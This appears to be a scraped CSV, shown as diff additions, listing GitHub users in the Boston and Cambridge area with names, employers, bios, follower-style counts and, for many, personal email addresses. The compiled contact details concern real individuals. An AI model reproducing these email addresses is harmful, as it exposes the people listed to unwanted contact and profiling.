+rijn,Rijn Bian,,,"Cambridge, MA",Cambridge,MA,bxbian951122@gmail.com,「星のない空に輝く光を」,85,366,https://github.com/rijn,filled
+jrk,Jonathan Ragan-Kelley,MIT,Associate Professor of Computer Science at MIT,"Cambridge, MA",Cambridge,MA,jrk@mit.edu,Associate Professor of Computer Science at MIT,150,364,https://github.com/jrk,filled
+burtbeckwith,Burt Beckwith,,,"Boston, MA",Boston,MA,burt@burtbeckwith.com,Computer user,507,364,https://github.com/burtbeckwith,filled
+cpytel,Chad Pytel,thoughtbot ,Developer and CEO at thoughtbot,"Boston, MA",Boston,MA,chad@thoughtbot.com,Developer and CEO at thoughtbot,13,363,https://github.com/cpytel,filled
+j256,Gray,,,"Boston, MA, USA, Earth",Boston,MA,,Java hacker.  C hacker in a previous life.,33,363,https://github.com/j256,filled
+derekprior,Derek Prior,GitHub,,"Boston, MA",Boston,MA,derekprior@gmail.com,,24,362,https://github.com/derekprior,filled
+lamm-mit,LAMM: MIT Laboratory for Atomistic and Molecular Mechanics,MIT,,"Cambridge, MA",Cambridge,MA,,"PI: Markus J. Buehler, MIT
+
+Our research focus on developing a new paradigm that designs materials from the molecular scale, using MD, ML and other methods",60,361,https://github.com/lamm-mit,filled
+ssalbdivad,David Blass,Pullfrog,"author @arktypeio, cocreator @standard-schema, cofounder @pullfrog⛵🐸🌱","Boston, MA",Boston,MA,david@arktype.io,"author @arktypeio, cocreator @standard-schema, cofounder @pullfrog⛵🐸🌱",27,359,https://github.com/ssalbdivad,filled
+iQuHACK,iQuHACK,,,"MIT: Cambridge, MA",MIT: Cambridge,MA,iquhack@mit.edu,MIT's Annual Quantum Hackathon,95,358,https://github.com/iQuHACK,filled
+dbaron,L. David Baron,,Engineer at @google working on @GoogleChrome,"near Boston, Massachusetts, USA",near Boston,MA,dbaron@dbaron.org,Engineer at @google working on @GoogleChrome.  Involved in web standards at @w3c (mainly CSS WG) and @whatwg.  Previously @mozilla and @w3ctag.,101,356,https://github.com/dbaron,filled
+quozd,Vitali Fokin,,,"Boston, MA",Boston,MA,vitali.fokin@gmail.com,,13,352,https://github.com/quozd,filled
+rdeits,Robin Deits,MIT,,"Cambridge, MA",Cambridge,MA,,,359,351,https://github.com/rdeits,filled
+dpickett,Dan Pickett,"Launch Academy, Inc",Developer developer,"Boston, MA / Bridgewater, MA",Boston,MA,,Developer developer.,91,351,https://github.com/dpickett,filled
+mautic,Mautic,,,"Boston, MA",Boston,MA,info@mautic.org,Free and Open Source Marketing Automation,130,349,https://github.com/mautic,filled
+xxv,Steve Pomeroy,,,"Somerville, MA",Somerville,MA,,I like to make things.,102,348,https://github.com/xxv,filled
+iamaaditya,aaditya prakash,ML Researcher,,"Boston, MA",Boston,MA,aaadityaprakash@gmail.com,Interested in applications of AI in healthcare.,73,345,https://github.com/iamaaditya,filled
+YingboMa,Yingbo Ma,JuliaComputing,,"Boston, MA",Boston,MA,mayingbo5@gmail.com,,137,345,https://github.com/YingboMa,filled
+MTACS,D.F.,macthemes-co , Runtime developer,Boston MA,Boston MA,,mtac@mtac.app, Runtime developer,110,342,https://github.com/MTACS,filled
+eyeseast,Chris Amico,MuckRock,"Journalist & Developer in Boston, working on @documentcloud @MuckRock","Boston, MA",Boston,MA,chris@muckrock.com,"Journalist & Developer in Boston, working on @documentcloud @MuckRock ",165,340,https://github.com/eyeseast,filled
+lizadaly,Liza Daly,,,"Somerville, MA",Somerville,MA,,Personal projects tends towards generative art and interactive fiction.,45,340,https://github.com/lizadaly,filled
+jessicajaniuk,Jessica Janiuk,Google,,"Boston, MA",Boston,MA,,This account is retired. Find Jessica at github.com/thePunderWoman.,6,339,https://github.com/jessicajaniuk,filled
+johannhof,Johann Hofmann,Google,,"Cambridge, Massachusetts",Cambridge,MA,mail@johann-hofmann.com,I work on Google Chrome,116,338,https://github.com/johannhof,filled
+SomeKittens,Randall Koutnik,linear ,,"Boston, MA",Boston,MA,rkoutnik@gmail.com,,93,337,https://github.com/SomeKittens,filled
+tompollard,Tom Pollard,MIT,,"Cambridge, MA",Cambridge,MA,,,91,335,https://github.com/tompollard,filled
+slightknack,Isaac Clayton,,,"Cambridge, MA",Cambridge,MA,hi@isaac.sh,Big into compilers,70,335,https://github.com/slightknack,filled
+geoffreylitt,Geoffrey Litt,MIT,,"Cambridge, MA",Cambridge,MA,,,84,331,https://github.com/geoffreylitt,filled
+blondegeek,Tess Smidt,atomicarchitects ,Atomic Architect,"Cambridge, MA",Cambridge,MA,,Associate Professor in EECS at MIT. Atomic Architect. Wrangler of neural nets. Geometry junkie. blondegeek.,53,330,https://github.com/blondegeek,filled
+dmitrizagidulin,Dmitri Zagidulin,MIT Digital Credentials Consortium,,"Boston, MA, USA",Boston,MA,dzagidulin@gmail.com,,99,328,https://github.com/dmitrizagidulin,filled
+Newbeeer,Yilun Xu,Massachusetts Institute of Technology,,"Cambridge, MA",Cambridge,MA,,Hello! 😃 ,21,325,https://github.com/Newbeeer,filled
+DavidVorick,David Vorick,Nebulous,,"Boston, MA",Boston,MA,david@glowlabs.org,Helping to scale solar to 100% of global energy production,35,320,https://github.com/DavidVorick,filled
+madars,Madars Virza,mit,Research Scientist @mitmedialab,"Cambridge, MA",Cambridge,MA,,"Research Scientist @mitmedialab . Co-authored @scipr-lab's libsnark, the C++ library for efficient zero-knowledge proofs.",31,316,https://github.com/madars,filled
+ItamarRocha,Itamar Rocha Filho,,,"Cambridge, MA",Cambridge,MA,itamardprf@gmail.com,CSE MS @ Harvard,27,316,https://github.com/ItamarRocha,filled
+brendanjmeade,Brendan Meade,Harvard University,Professor of Earth & Planetary Sciences at Harvard University,"Cambridge, MA",Cambridge,MA,,Professor of Earth & Planetary Sciences at Harvard University,54,315,https://github.com/brendanjmeade,filled
+sjgershm,Sam Gershman,Harvard University,"Professor, Department of Psychology and Center for Brain Science, Harvard University","Cambridge, MA",Cambridge,MA,,"Professor, Department of Psychology and Center for Brain Science, Harvard University",37,314,https://github.com/sjgershm,filled
+ryanhlewis,Ryan Hardesty Lewis,"Good-Systems, @TACC, @EGaDSAustin",,"Cambridge, MA",Cambridge,MA,rhl@mit.edu,The road is made by walking.,48,314,https://github.com/ryanhlewis,filled
+dgiese,Dennis Giese,,,"Boston, MA",Boston,MA,dennis@dontvacuum.me,,25,311,https://github.com/dgiese,filled
+birdsarah,Sarah Bird,,,"Boston, MA",Boston,MA,,"Product builder skilled with data and cross-functional collaboration. Python, TypeScript, JavaScript, C++, Rust, Linux, Pandas, Data Viz, CSS, ...",57,309,https://github.com/birdsarah,filled
+HendrikStrobelt,Hendrik Strobelt,IBM Research,,"Cambridge, MA, USA",Cambridge,MA,,"IBM Research // MIT-IBM AI Lab
+-- Co-author of MiniConf, GLTR, LSTMVis, GanPaint,...",62,305,https://github.com/HendrikStrobelt,filled
+rkhetani,Radhika Khetani,hbc ,,"Boston, MA",Boston,MA,khetani.r@gmail.com,,65,305,https://github.com/rkhetani,filled
+jeffkaufman,Jeff Kaufman,Nucleic Acid Observatory,,Somerville MA,Somerville MA,,jeff.t.kaufman@gmail.com,,109,305,https://github.com/jeffkaufman,filled
+crowell,Jeffrey Crowell,,,"Boston, MA",Boston,MA,jeff@crowell.biz,,108,301,https://github.com/crowell,filled
+odewahn,Andrew Odewahn,,,"Boston, MA",Boston,MA,andrew@odewahn.com,,301,299,https://github.com/odewahn,filled
+githwxi,Hongwei Xi,"ATS Trustful Software, Inc.",,"Boston, Massachusetts",Boston,MA,,"As the creator of ATS, he is currently primarily working on designing and implementing and maintaining the ATS3/Xanadu programming language system.",19,299,https://github.com/githwxi,filled
+raysalemi,Ray Salemi,Natick High School,I teach physics and engineering at Natick High School,"Boston, MA",Boston,MA,ray@raysalemi.com,"I teach physics and engineering at Natick High School.
+
+In the past, I was a computer engineer, and I wrote the initial version of pyuvm and The UVM Primer.",11,298,https://github.com/raysalemi,filled
+harrah,Mark Harrah,,,"Boston, MA",Boston,MA,,,18,298,https://github.com/harrah,filled
+bluesmoon,Philip Tellis,Akamai (formerly @SOASTA (formerly @LogNormal)),,"Cambridge, MA",Cambridge,MA,philip@bluesmoon.info,,53,296,https://github.com/bluesmoon,filled
+SmartBear,SmartBear Software,,,"450 Artisan Way Somerville, MA 02145",450 Artisan Way Somerville,MA,info@smartbear.com,Think Bigger. Build Smarter.,154,294,https://github.com/SmartBear,filled
+mattmight,Matthew Might,,"professor, etc","Birmingham, AL | Boston, MA",Birmingham,AL,,"professor, etc.",34,293,https://github.com/mattmight,filled
+mit-dci,The MIT Digital Currency Initiative @ Media Lab,,,"Cambridge, MA",Cambridge,MA,,,66,290,https://github.com/mit-dci,filled
+koosaga,Jaehyun Koo,,,"Cambridge, MA, USA",Cambridge,MA,,,8,287,https://github.com/koosaga,filled
+sartak,Shawn M Moore,Anthropic,,"Somerville, MA",Somerville,MA,,,130,285,https://github.com/sartak,filled
+michaelkleber,Michael Kleber,googlechrome,,"Cambridge, MA",Cambridge,MA,,"Mathematician, at Google, keeping the web thriving.
+",8,281,https://github.com/michaelkleber,filled
+stonier,Daniel Stonier,Toyota Research Institute,,"Boston, Massachusetts",Boston,MA,d.stonier@gmail.com,,185,278,https://github.com/stonier,filled
+dupontgu,Guy Dupont,Sanctuary Computer,,"Cambridge, MA",Cambridge,MA,dupontgu@gmail.com,,46,277,https://github.com/dupontgu,filled
+ryancheunggit,Ren Zhang,Google,,Cambridge MA,Cambridge MA,,ryanzjlib@gmail.com,,30,275,https://github.com/ryancheunggit,filled
+jingnanshi,Jingnan Shi,Massachusetts Institute of Technology,,"Cambridge, MA",Cambridge,MA,,MIT Robotics PhD,48,273,https://github.com/jingnanshi,filled
+brilee,Brian Lee,,,"Cambridge, MA",Cambridge,MA,brian.kihoon.lee@gmail.com,,20,272,https://github.com/brilee,filled
+jwohlwend,Jeremy Wohlwend,MIT,,"Cambridge, MA",Cambridge,MA,jeremy.wohlwend@gmail.com,"PhD Student @ MIT, CSAIL",19,271,https://github.com/jwohlwend,filled
+metalicjames,James Lovejoy,,,"Cambridge, MA",Cambridge,MA,jameslovejoy1@gmail.com,Formerly @mit-dci. Interested in distributed systems and the future of money.,61,270,https://github.com/metalicjames,filled
+refack,Refael Ackermann,,,"Cambridge, MA",Cambridge,MA,refack@gmail.com,,163,269,https://github.com/refack,filled
+TrevorBurnham,Trevor Burnham,Amazon,,"Cambridge, MA",Cambridge,MA,trevorburnham@gmail.com,"👨🏻‍💻 Author of Test-Driven React and Secrets of the JavaScript Ninja, Third Edition.",110,269,https://github.com/TrevorBurnham,filled
+CSAILVision,MIT CSAIL Computer Vision,,,"Cambridge, MA",Cambridge,MA,,,19,269,https://github.com/CSAILVision,filled
+harvardinformatics,Harvard Informatics,,,Cambridge MA,Cambridge MA,,,,179,261,https://github.com/harvardinformatics,filled
+plusk01,Parker Lusk,MIT Aerospace Controls Lab,,"Cambridge, MA",Cambridge,MA,parkerclusk@gmail.com,"Perception, estimation and control of flying robots",105,260,https://github.com/plusk01,filled
+Moelf,Jerry Ling,,,"Cambridge, MA",Cambridge,MA,proton@jling.dev,HEP-ex PhD student @ Harvard LPPC; @JuliaHEP ,230,256,https://github.com/Moelf,filled
+mattblackwell,Matthew Blackwell,Harvard University,"Associate Professor of Government, Harvard University","Cambridge, MA",Cambridge,MA,mblackwell@gov.harvard.edu,"Associate Professor of Government, Harvard University",32,250,https://github.com/mattblackwell,filled
+Sakits,Jiaming Tang,"MIT, EECS",,"Cambridge, MA",Cambridge,MA,jmtang@mit.edu,"Ph.D. student @ MIT; MLSys & Algo.
+",10,246,https://github.com/Sakits,filled
+johnny-rice,Johnny Rice,Tech Advisor and Mentor,,"Boston, Massachusetts",Boston,MA,jrice@labact.com,"Over 20 years of software dev, startup experience, instruction, mentoring, project, and people management.",1050,246,https://github.com/johnny-rice,filled
+KentoNishi,Kento Nishi,Harvard University,Undergrad AI researcher and web developer at Harvard,"Cambridge, MA / San Jose, CA",Cambridge,MA,kento24gs@outlook.com,Undergrad AI researcher and web developer at Harvard.,72,242,https://github.com/KentoNishi,filled
+chriselrod,Chris Elrod,Modular,,"Somerville, MA",Somerville,MA,,,169,239,https://github.com/chriselrod,filled
+yyuanad,Yuan Yuan,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,yyuanad@gmail.com,,12,238,https://github.com/yyuanad,filled
+ankitvgupta,Ankit Gupta,Reverie Labs,"Formerly co-founder @reverielabs, research @harvardnlp","Cambridge, Massachusetts",Cambridge,MA,,"general partner at y combinator. 
+
+Formerly co-founder @reverielabs, research @harvardnlp.",49,227,https://github.com/ankitvgupta,filled
+nhejazi,nima hejazi,Harvard Chan School of Public Health,assistant professor of biostatistics at the harvard chan school of public health,"Boston, Massachusetts",Boston,MA,nh@nimahejazi.org,assistant professor of biostatistics at the harvard chan school of public health,76,220,https://github.com/nhejazi,filled
+Mars-tin,Martin Ziqiao Ma,University of Michigan,,"Cambridge, Massachusetts, USA",Cambridge,MA,marstin@umich.edu,"phd<<<1,1>>>(UMich);
+ex<<<3,1>>>({Amazon, Adobe, MIT_IBM_Watson});",18,218,https://github.com/Mars-tin,filled
+Richarizardd,Richard Chen,,,"Boston, Massachusetts",Boston,MA,richardchen@g.harvard.edu,"AI for Pathology @ Harvard Medical School, Brigham and Women's Hospital",6,210,https://github.com/Richarizardd,filled
+chrisntr,ChrisNTR,,,"Somerville, MA",Somerville,MA,chrisntr@gmail.com,,44,210,https://github.com/chrisntr,filled
+panphora,David Miranda,Hyperclay,"Developer, designer, and entrepreneur who loves making products","Somerville, MA",Somerville,MA,david@storylog.com,"Developer, designer, and entrepreneur who loves making products.",78,203,https://github.com/panphora,filled
+alec-chernicki,Alec Chernicki,netflix,,"Boston, Massachusetts ",Boston,MA,aleccortega@gmail.com,"Client Foundations @netflix. 
+
+Previously @disneystreaming, @ezcater, @HubSpot.
+
+Building @commonalityco ",30,201,https://github.com/alec-chernicki,filled
+voidism,Yung-Sung Chuang,"CSAIL, MIT",,"Cambridge, Massachusetts",Cambridge,MA,b05901033@ntu.edu.tw,"EECS PhD student at MIT CSAIL. First author of MetaCLIP 2, DoLa, SelfCite, DiffCSE",63,188,https://github.com/voidism,filled
+ali,Ali Ukani,,,"Somerville, MA",Somerville,MA,,,123,184,https://github.com/ali,filled
+connorgr,Connor Gramazio,PillPack,,"Boston, Massachusetts",Boston,MA,,Brown computer science PhD'17. Tufts BS'12. ML + DataVis + HCI,32,181,https://github.com/connorgr,filled
+paulbert,Paul,,,"Somerville, MA",Somerville,MA,paul.r.albert@gmail.com,,24,176,https://github.com/paulbert,filled
+ZECTBynmo,Mike Vegeto,,,Somerville MA,Somerville MA,,,while(true) { code() },229,167,https://github.com/ZECTBynmo,filled
+paulkernfeld,Paul Kernfeld,,,"Somerville, MA",Somerville,MA,,"I like Rust, machine learning, Python, and statistics",140,167,https://github.com/paulkernfeld,filled
+ewadkins,Eric Wadkins,"Google, MIT Media Lab",,"Boston, Massachusetts",Boston,MA,ewadkins@alum.mit.edu,I'm a graduate of MIT's Class of 2018 and current M.Eng. student in AI at the MIT Media Lab.,43,164,https://github.com/ewadkins,filled
+floresacton,Miguel Flores-Acton,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,floresacton@gmail.com,"""Do or do not, there is no try"" - Yoda",83,159,https://github.com/floresacton,filled
+mitchellwrosen,Mitchell Dalvi Rosen,unison,,"Somerville, MA",Somerville,MA,mitchellwrosen@gmail.com,,319,156,https://github.com/mitchellwrosen,filled
+evijit,Avijit Ghosh,huggingface ,Technical AI Policy Researcher at Hugging Face 🤗,"Boston, Massachusetts ",Boston,MA,avijitg22@gmail.com,Technical AI Policy Researcher at Hugging Face 🤗 ,71,144,https://github.com/evijit,filled
+pikurasa,Devin Ulibarri,"Executive Director, Sugar Labs",,"Somerville, MA",Somerville,MA,,,14,137,https://github.com/pikurasa,filled
+Showndarya,Showndarya,Boston University,CS Graduate at Boston University | Incoming Data Intelligence Developer @ StateStreet,"Boston, Massachusetts ",Boston,MA,shmadhav@bu.edu,CS Graduate at Boston University | Incoming Data Intelligence Developer @ StateStreet,47,135,https://github.com/Showndarya,filled
+devinmatte,Devin Matté,Datadog,,"Somerville, MA",Somerville,MA,devin@devinmatte.com,I like to make things sometimes,87,131,https://github.com/devinmatte,filled
+muammar,Muammar El Khatib,,,"Greater Boston, Massachusetts ",Greater Boston,MA,,I am a PhD in Theoretical Physical Chemistry who also likes coding.,89,130,https://github.com/muammar,filled
+makmanalp,"Mehmet Ali ""Mali"" Akmanalp",cid-harvard ,,"Somerville, MA",Somerville,MA,,Nerd,39,129,https://github.com/makmanalp,filled
+petermattia,Peter Attia,Glimpse,,"Somerville, MA",Somerville,MA,,I ❤️🔋,18,129,https://github.com/petermattia,filled
+jchambers,Jon Chambers,,,"Somerville, MA, USA",Somerville,MA,,,46,126,https://github.com/jchambers,filled
+jsandler18,Jake Sandler,Chronosphere,,"Somerville, MA",Somerville,MA,jsandler18@gmail.com,,25,126,https://github.com/jsandler18,filled
+vault50,CS50 Vault,,,"Cambridge, Massachusetts, USA",Cambridge,MA,,@CS50's lesson plans and sample solutions,0,125,https://github.com/vault50,filled
+0x00b1,Allen Goodman,,,"Somerville, MA",Somerville,MA,allen.goodman@icloud.com,,13,123,https://github.com/0x00b1,filled
+michaelballantyne,Michael Ballantyne,nuprl,,"Boston, Massachusetts",Boston,MA,michael.ballantyne@gmail.com,,127,119,https://github.com/michaelballantyne,filled
+zgrossbart,Zack Grossbart,,,"Somerville, MA",Somerville,MA,zack@grossbart.com,,37,119,https://github.com/zgrossbart,filled
+jlev,Josh Levinger,spacedogXYZ ,Founding Engineer @elephantenergy-us,"Somerville, MA",Somerville,MA,josh@levinger.net,"Founding Engineer @elephantenergy-us.  Previously @impactobservatory, @OpenSourceActivismTech, @spacedogXYZ. Coached @truckeerobotics. Alumnus @mit @mitmedialab",48,115,https://github.com/jlev,filled
+CityScope,CityScope,,,"Cambridge, Massachusetts, United States",Cambridge,MA,,MIT CityScope project,74,114,https://github.com/CityScope,filled
+dmmiller612,Derek Miller,DeepCure,,"Boston, Massachusetts",Boston,MA,dmmiller612@gmail.com,,21,114,https://github.com/dmmiller612,filled
+roudimit,Andrew Rouditchenko,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,,"PhD Student at MIT CSAIL
+",13,111,https://github.com/roudimit,filled
+RyanMullins,Ryan Mullins,google,,"Somerville, MA",Somerville,MA,ryan@ryanmullins.org,"I'm interested in Human-AI collaboration in the areas of analysis, planning, and security",22,111,https://github.com/RyanMullins,filled
+livechat,LiveChat,,Join LiveChat Developer Program https://platform,"Boston, Massachusetts",Boston,MA,support@livechat.com,Join LiveChat Developer Program https://platform.text.com/,166,110,https://github.com/livechat,filled
+stbrody,Spencer T Brody,recallnet,Software engineer working on the decentralized web,"Somerville, MA",Somerville,MA,,Software engineer working on the decentralized web. He/him.,14,110,https://github.com/stbrody,filled
+mattdm,Matthew Miller,RedHatOfficial,Fedora Project Leader and Distinguished Engineer @ Red Hat,"Somerville, MA",Somerville,MA,,Fedora Project Leader and Distinguished Engineer @ Red Hat. Hobby coder.,63,108,https://github.com/mattdm,filled
+feoh,Chris Patti,I'm a Senior Devops Engineer with the Open Learning Engineering team @MIT,,"Somerville, MA.",Somerville,MA,feoh@feoh.org,Perpetually in pursuit of the bright shiny :) Card carrying Pythonista but I try to be pragmatic about tools.,67,108,https://github.com/feoh,filled
+iitalics,Milo,,,"Somerville, MA",Somerville,MA,iitalics@gmail.com,"Milo Turner. '21 Northeastern CS graduate. Boston MA. Systems programming in Rust by day, language-oriented programming in Racket by night.",103,107,https://github.com/iitalics,filled
+surajpaib,Suraj Pai,AIM-Harvard ,,"Boston, Massachusetts",Boston,MA,bspai@bwh.harvard.edu,PhD candidate at AIM Lab | Harvard Medical School & Maastricht University,178,105,https://github.com/surajpaib,filled
+rtre84,Anup Vasudevan,,,"Boston, Massachusetts",Boston,MA,rtre84@live.com,,111,105,https://github.com/rtre84,filled
+delton137,Dan Elton,Mass General Hospital,,"Boston, Massachusetts ",Boston,MA,,https://www.moreisdifferent.com,43,103,https://github.com/delton137,filled
+nataliepo,nataliepo,,,"Somerville, MA",Somerville,MA,npodrazik@gmail.com,,40,100,https://github.com/nataliepo,filled
+a20r,Alex Wallar,theroutingcompany,Cofounder / CTO @ The Routing Company | Former PhD student @ MIT CSAIL,"Somerville, MA",Somerville,MA,alex@theroutingcompany.com,Cofounder / CTO @ The Routing Company | Former PhD student @ MIT CSAIL,82,96,https://github.com/a20r,filled
+ushadow,Ying Yin,YouTube,,"Cambridge, Massachusetts",Cambridge,MA,,,38,94,https://github.com/ushadow,filled
+am-becker,Aaron Becker,MIT,,"Cambridge, Massachusetts",Cambridge,MA,aaron.becker@gmail.com,"Home of my software-driven personal and team projects // student at MIT in Cambridge, MA",67,94,https://github.com/am-becker,filled
+Formlabs,formlabs,,,"Somerville, MA",Somerville,MA,,"Formlabs Is Expanding Access to Digital Fabrication, So Anyone Can Make Anything",69,92,https://github.com/Formlabs,filled
+FrederickGeek8,Frederick Morlock,,,"Cambridge, Massachusetts",Cambridge,MA,me@freddy.us,"I’m a small town, earthy crunchy hacker passionate about coding, machine learning, teaching, and tinkering. Constantly curious and obsessively learning.",77,88,https://github.com/FrederickGeek8,filled
+mxmeinhold,Max Meinhold,DataDog,,"Somerville, MA",Somerville,MA,mxmeinhold@gmail.com,"SE @DataDog,
+Sometime maintainer for @ComputerScienceHouse",66,88,https://github.com/mxmeinhold,filled
+sdaitzman,Sam Daitzman,Schema,Software engineering and product design! Olin College alum,"Cambridge, Massachusetts, USA",Cambridge,MA,sam@daitzman.com,Software engineering and product design! Olin College alum,115,86,https://github.com/sdaitzman,filled
+BU-Spark,BU Spark!,,BU Spark! is an initiative to support student-driven innovation and entrepreneurship in computer sci,"Boston, Massachusetts",Boston,MA,bostonuniversityspark@gmail.com,"BU Spark! is an initiative to support student-driven innovation and entrepreneurship in computer science, computer engineering and related disciplines.",211,85,https://github.com/BU-Spark,filled
+eropple,Ed Ropple,,,"Somerville, MA",Somerville,MA,ed+github@edropple.com,,127,85,https://github.com/eropple,filled
+theAnshulGupta,Anshul Gupta,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,,cs at mit,29,84,https://github.com/theAnshulGupta,filled
+FieteLab,,,,"Cambridge, Massachusetts",Cambridge,MA,,Fiete Lab @ MIT,23,84,https://github.com/FieteLab,filled
+CityOfBoston,City of Boston,,,"Boston, Massachusetts, USA",Boston,MA,doit@boston.gov,,130,83,https://github.com/CityOfBoston,filled
+nalind,Nalin Dahyabhai,Red Hat,,"Greater Boston, Massachusetts, USA",Greater Boston,MA,nalin@redhat.com,"Fixing some bugs, writing other bugs.",80,83,https://github.com/nalind,filled
+DreamDevourer,Nick,Epic Digital,Product Designer Program Lead and HubSpot CMS/CRM Developer,"Boston, Massachusetts, United States",Boston,MA,,Product Designer Program Lead and HubSpot CMS/CRM Developer,39,83,https://github.com/DreamDevourer,filled
+echonest,The Echo Nest,,,"Somerville, MA",Somerville,MA,contact@echonest.com,,45,82,https://github.com/echonest,filled
+michaelchughes,Mike Hughes,"tufts-ml : Tufts University, Department of Computer Science",,"Somerville, MA",Somerville,MA,mike@michaelchughes.com,Assistant Prof. of Computer Science at Tufts @tufts-ml -- Postdoc Harvard SEAS @dtak (2016-18) -- Ph.D. Brown U. CS (2010-16) @bnpy -- B.S. Olin College (2010),18,81,https://github.com/michaelchughes,filled
+stephen304,Stephen Smith,,,"Somerville, MA",Somerville,MA,stephen304@gmail.com,,78,81,https://github.com/stephen304,filled
+ericyangyu,Eric Yu,Massachusetts Institute of Technology,,"Cambridge, Massachusetts",Cambridge,MA,eyyu@mit.edu,"PhD student working on safe RL in REALM lab @ MIT, advised by Prof. Chuchu Fan.",16,79,https://github.com/ericyangyu,filled
+BoschSamuel,Samuel Bosch, KEEPONai,"Co-Founder & CEO of KEEPON, former MIT PhD candidate in AI","Cambridge, Massachusetts",Cambridge,MA,,"Co-Founder & CEO of KEEPON, former MIT PhD candidate in AI",10,76,https://github.com/BoschSamuel,filled
+jeffbyrnes,Jeff Byrnes,athenahealth,"🎶 🎸 bassist 
+💻 ops engineering manager 
+🍸 cocktail enthusiast 
+🎮 video gamer 
+👔 snappy dresser","Somerville, MA",Somerville,MA,,"🎶 🎸 bassist 
+💻 ops engineering manager 
+🍸 cocktail enthusiast 
+🎮 video gamer 
+👔 snappy dresser ",105,75,https://github.com/jeffbyrnes,filled
+rtucker,Rey Tucker,OwO Group LLC,,"Somerville, MA, USA",Somerville,MA,github@reytucker.us,"Burned-out techie, starting to get back on her feet",66,75,https://github.com/rtucker,filled
+ctesta01,Christian Testa,Harvard T.H. Chan School of Public Health,,"Boston area, Massachusetts",Boston area,MA,,I'm using mathematical models to better understand how we can improve health equity.  ⧉,61,73,https://github.com/ctesta01,filled
+cs61,Harvard CS61,,,"Cambridge, Massachusetts",Cambridge,MA,,,23,72,https://github.com/cs61,filled
+npe9,Noah Evans,Draper Laboratories,,Cambridge Massachusetts,Cambridge Massachusetts,,,,180,70,https://github.com/npe9,filled
+5space,5space,,,"Cambridge, Massachusetts",Cambridge,MA,,"MIT class of 2025, he/him |
+
+
+finally getting around to uploading my old stuff to github",27,70,https://github.com/5space,filled
+jducoeur,"Justin du Coeur, AKA Mark Waks",Querki Inc.,,"Somerville, MA",Somerville,MA,,,56,70,https://github.com/jducoeur,filled
+omicreativedev,Salome Shunamon,,,"Somerville, MA, United States",Somerville,MA,,Computer Science Student,25,70,https://github.com/omicreativedev,filled
+jsundram,Jason Sundram,,,"Somerville, MA",Somerville,MA,,,41,70,https://github.com/jsundram,filled
+gregmarra,Greg Marra,Meta,,"Somerville, MA",Somerville,MA,greg.marra@gmail.com,,27,69,https://github.com/gregmarra,filled
+bbarenblat,Benjamin Barenblat,,,"Cambridge, Massachusetts",Cambridge,MA,bbarenblat@gmail.com,,83,68,https://github.com/bbarenblat,filled
+timmc,Tim McCormack,,Software developer,"Somerville, MA, USA",Somerville,MA,cortex@brainonfire.net,Software developer. All of my newer work is on Codeberg rather than GitHub; my current professional work is at @timmc-edx,167,68,https://github.com/timmc,filled
+ericrobskyhuntley,Eric Robsky Huntley,mit-spatial-action @ographiesresearch,"Lecturer in Urban Science and Planning, MIT DUSP (Director, @mit-spatial-action)","Somerville, MA",Somerville,MA,ericrobskyhuntley@proton.me,"Lecturer in Urban Science and Planning, MIT DUSP (Director, @mit-spatial-action). Principal, @ographiesresearch. AFT-AAUP Local 6741.",29,68,https://github.com/ericrobskyhuntley,filled
+massgov-eohhs,EOHHS,,,"Boston, Massachusetts",Boston,MA,,Executive Office of Health and Human Services,0,67,https://github.com/massgov-eohhs,filled
+Winter-Guerra,Winter Guerra,,"Computer Vision & Robotics; MIT Masters of Engineering, EECS Department","Cambridge, Massachusetts",Cambridge,MA,winterg@alum.mit.edu,"Computer Vision & Robotics; MIT Masters of Engineering, EECS Department. MIT Class of 2017.",38,66,https://github.com/Winter-Guerra,filled
+grahamboree,Graham Pentheny,SpryFox ,"Engineer @SpryFox, @recastnavigation Maintainer, Boston Game Dev organizer, Indie Game Collective, h","Boston, Massachusetts",Boston,MA,,"Sr. Engineer @SpryFox, @recastnavigation Maintainer, Boston Game Dev organizer, Indie Game Collective, he/him",22,66,https://github.com/grahamboree,filled
+johnzl-777,John Long,QuEra Computing Inc.,Scientific Software Developer @QuEraComputing,"Boston, Massachusetts",Boston,MA,johnzl.dev@gmail.com,Scientific Software Developer @QuEraComputing ,44,66,https://github.com/johnzl-777,filled
+harrislapiroff,Harris Bard Lapiroff,freedomofpress ,Engineering Manager at @freedomofpress,Somerville MA,Somerville MA,,harris@chromamine.com,"Engineering Manager at @freedomofpress. Trying to do good well. Jack of all trades, master of a few. He/him.",61,66,https://github.com/harrislapiroff,filled
+kunalbotla,Kunal Botla,hackclub,tufts architecture + the museum school,"boston + cambridge, massachusetts",boston + cambridge,MA,kunal@kunalbotla.com,tufts architecture + the museum school. @hackclub alum.,52,65,https://github.com/kunalbotla,filled
+raunakdoesdev,Raunak Chowdhuri,Reducto AI,"I’m into open science, elegant software architecture, and well-crafted interfaces","Cambridge, Massachusetts",Cambridge,MA,raunak@reducto.ai,"Founder @ Reducto AI. I’m into open science, elegant software architecture, and well-crafted interfaces. ",103,65,https://github.com/raunakdoesdev,filled
+jacobc2700,Jacob Chang,"University of Illinois, Urbana-Champaign",,"Boston, Massachusetts",Boston,MA,jacobchang124@gmail.com,"Hello, I'm Jacob.",13,65,https://github.com/jacobc2700,filled
+mikesteele,Mike Steele,Spotify,,"Somerville, MA, USA",Somerville,MA,,,11,65,https://github.com/mikesteele,filled
+lorinanthony,Lorin Crawford,,,"Cambridge, Massachusetts ",Cambridge,MA,lorin_crawford@brown.edu,Statistical Genetics. Genomics. Topological Data Analysis (TDA).,5,64,https://github.com/lorinanthony,filled
+KingOfBrian,Brian King,,,Boston Massachusetts,Boston Massachusetts,,brianaking@gmail.com,,59,64,https://github.com/KingOfBrian,filled
+ojasphansekar,Ojas Phansekar,Northeastern University,"Data Engineer | Business Intelligence Developer | Machine Learning Enthusiast | MS, Information Syst","Boston, Massachusetts",Boston,MA,phansekar.o@husky.neu.edu,"Data Engineer | Business Intelligence Developer | Machine Learning Enthusiast | MS, Information Systems | MS, Data Science",13,64,https://github.com/ojasphansekar,filled
+yelsayed,Yasser El-Sayed,"Carnegie Mellon University, Computer Science",,"Boston, Massachusetts",Boston,MA,ysr.sayed@gmail.com,,27,64,https://github.com/yelsayed,filled
